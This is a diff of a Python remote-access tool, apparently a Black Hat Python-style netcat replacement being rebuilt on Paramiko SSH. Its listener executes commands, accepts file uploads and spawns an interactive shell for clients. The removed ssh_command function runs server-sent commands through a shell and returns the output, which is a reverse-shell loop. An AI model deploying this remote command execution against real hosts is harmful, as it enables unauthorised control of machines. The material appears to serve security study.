@@ -60,7 +60,7 @@ import threading
 import subprocess
 import getpass
 from textwrap import dedent
-from typing import Tuple, Union, List, Optional
+from typing import Tuple, Union, List
 
 
 class Helpers:
@@ -297,11 +297,11 @@ class SshcAttributes:
     """Listening server's Timeout value"""
 
 
-class ShutdownListen(socket.error):
+class ShutdownServer(socket.error):
     """Custom error used to shutdown listening server"""
 
 
-class CloseConnection(socket.error):
+class ShutdownClient(socket.error):
     """Custom error used to safely disconnect connecting client"""
 
 
@@ -324,8 +324,6 @@ class SSHCustom:
         self.help = Helpers()
         """Helper static functions"""
 
-    # # # Connection Functions
-
     def verprint(self, *to_print) -> None:
         """
         Default check against verbosity attribute, to see if allowed to print
@@ -347,40 +345,65 @@ class SSHCustom:
             # Time to listen, potentially upload items, execute commands, and drop a shell back
             child = SSHServer()
             child.server()
-            # self.listening_server()
 
         else:
             # Try connecting to target, send a potential starting command
             child = SSHClient()
+            child.client()
 
-            self.connecting_client()
 
+class SSHServer(SSHCustom, paramiko.ServerInterface):
+    """Custom SSH client, using Paramiko API wrapper"""
 
-class SSHServer(SSHCustom):
-    """Custom SSH client, using paramiko API wrapper"""
+    def __init__(self):
+        super(SSHServer, self).__init__()
+        # Extension to super init, name spacing an Event
+        self.event = threading.Event()
+
+    def check_channel_request(self, kind, chanid):
+        # ServInt override, enable simple check channel request
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+    def check_auth_password(self, username, password):
+        # ServInt override, bind auth check to our super namespace attributes
+        if (username == self.atts.user) and (password == self.atts.password):
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
 
     def server(self):
         """
         Start a TCP server socket, spool threads to handle incoming clients
         """
 
-        # Spool listening server
-        server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
-        server.bind((self.atts.target, self.atts.port))
-        server.listen(5)
-
         self.verprint(f"[*] Listening on {self.atts.target}:{self.atts.port}")
+        try:
+            # Spool SSH server
+            server = socket.socket()
 
-        while self.atts.listening_active:
-            server_acceptance = server.accept()  # Tuple containing client_socket and addr
-            if self.atts.listening_active:
-                client_thread = threading.Thread(target=self.handle_connects,
-                                                 args=(server_acceptance,))
-                client_thread.start()
+            # Bind socket settings
+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server.bind((self.atts.target, self.atts.port))
+            server.listen(5)
+
+            while self.atts.listening_active:
+                server_acceptance = server.accept()  # Tuple containing client_socket and addr
+                if self.atts.listening_active:
+                    client_thread = threading.Thread(target=self.handle_connects,
+                                                     args=(server_acceptance,))
+                    client_thread.start()
+        except ShutdownServer:
+            print("")
+
+        except Exception as err:
+            closing = dedent(f"""
+                --[*] Unexpected error: {err}
+                ----- Closing server""")
 
     def handle_connects(self, connected_client: Tuple[socket.socket, any]):
         """
-        Called by server socket in server for each connection.
+        Called by server socket for each connection.
         File upload, command execution, and/or interactive shell through given client socket
 
         Args:
@@ -409,26 +432,26 @@ class SSHServer(SSHCustom):
                 # Try to execute a given file
                 response = self.help.bin_join(self.run_command(self.atts.execute), response)
 
+            # Determine if server set to init shell or not. Respond either way
             if not self.atts.shell:
-                # Listener not set to init shell. Send response and close
                 response = self.help.bin_join(
                     response, f"\nClosing connection to {self.atts.target}:{self.atts.port}")
                 self.help.send_data(to_socket=client_socket, data_stream=response)
             else:
-                # Initiate shell
                 self.shell_loop(client_socket, response)
 
-        except CloseConnection:
+        except ShutdownClient:
             closing = dedent(f"""
             --[*] Client requested connection close
             ----- Closing handler {addr[0]}:{addr[1]}
             """)
-        except ShutdownListen:
+        except ShutdownServer:
             closing = dedent(f"""
             --[*] Client {addr[0]}:{addr[1]} requested shutdown listening post
             ----- Shutting down
             """)
-            self.atts.listening_active = False
+            # self.atts.listening_active = False
+            raise ShutdownServer
         except Exception as err:
             closing = dedent(f"""
             --[*] Unexpected error: {err}
@@ -456,9 +479,9 @@ class SSHServer(SSHCustom):
 
         # Catch bhp specific commands in stream
         if self.atts.close_connection in str(stream):
-            raise CloseConnection
+            raise ShutdownClient
         if self.atts.shutdown_listening in str(stream):
-            raise ShutdownListen
+            raise ShutdownServer
 
     def write_file(self, data_buffer) -> bytes:
         """
@@ -538,7 +561,7 @@ class SSHServer(SSHCustom):
 class SSHClient(SSHCustom):
     """Custom SSH Client, , using paramiko API wrapper"""
 
-    def connecting_client(self):
+    def client(self):
         """
         Spool up TCP socket, catch return data, prompt for new to_send. Rinse and repeat
         """
@@ -569,7 +592,7 @@ class SSHClient(SSHCustom):
 
             # Build initial data to send
             if self.atts.upload:
-                to_send = self.connecting_file_stream()
+                to_send = self.file_stream()
             else:
                 to_send = self.help.bin_join(self.atts.initial_cmd, '\n')
 
@@ -602,7 +625,7 @@ class SSHClient(SSHCustom):
                     f"Unexpected error when disconnecting from {self.atts.target}:{self.atts.port}")
                 self.verprint(err)
 
-    def connecting_file_stream(self):
+    def file_stream(self):
         """
         Targets file at upload and converts to binary stream, to send to listening server
 
@@ -619,71 +642,3 @@ class SSHClient(SSHCustom):
 if __name__ == '__main__':
     nc = SSHCustom()
     nc.main()
-
-
-def ssh_command(*,
-                ip: str = None, port: int = None, user: str = None, password: str = None,
-                command: str = None, known_hosts: Optional[str] = None, catch_banner: bool=True):
-    """
-    Interactive SSH command client, using paramiko API. Designed to connect to matching dedicated
-    server
-
-    Args:
-        ip:
-            target IP                           (Def localhost)
-        port:
-            target port                         (Def 2222)
-        user:
-            Username to pass to target IP       (Def running user)
-        password:
-            password to pass to target IP       (Def '')
-        command:
-            1st command to send to custom SSH   (Def 'ClientConnected')
-        known_hosts:
-            Optional key support, using absolute path to .ssh/known_hosts
-        catch_banner:
-            boolean to tell function to receive banner data before starting command loop
-    """
-
-    if not ip:
-        ip = 'localhost'
-    if not port:
-        port = 2222
-    if not user:
-        user = getpass.getuser()
-    if not password:
-        password = ''
-    if not command:
-        command = 'ClientConnected'
-
-    # Bind new SSH client
-    client: paramiko.SSHClient = paramiko.SSHClient()
-    # Optional key support
-    if known_hosts:
-        client.load_host_keys(known_hosts)
-    # Auto add missing keys
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    # Connect
-    client.connect(ip, port=port, username=user, password=password)
-    # request session channel to server
-    ssh_session = client.get_transport().open_session()
-
-    if ssh_session.active:
-        if catch_banner:
-            send_data(to_socket=ssh_session, data_stream=command.encode())
-            banner = receive_data(from_socket=ssh_session)
-            print(banner.decode())
-
-        # Primary loop
-        while True:
-            server_command = receive_data(from_socket=ssh_session)
-            try:
-                cmd_output = subprocess.check_output(server_command, shell=True)
-                send_data(to_socket=ssh_session, data_stream=cmd_output)
-            except Exception as err:
-                send_data(to_socket=ssh_session, data_stream=str(err).encode())
-                break
-        client.close()
-
-
-ssh_command()
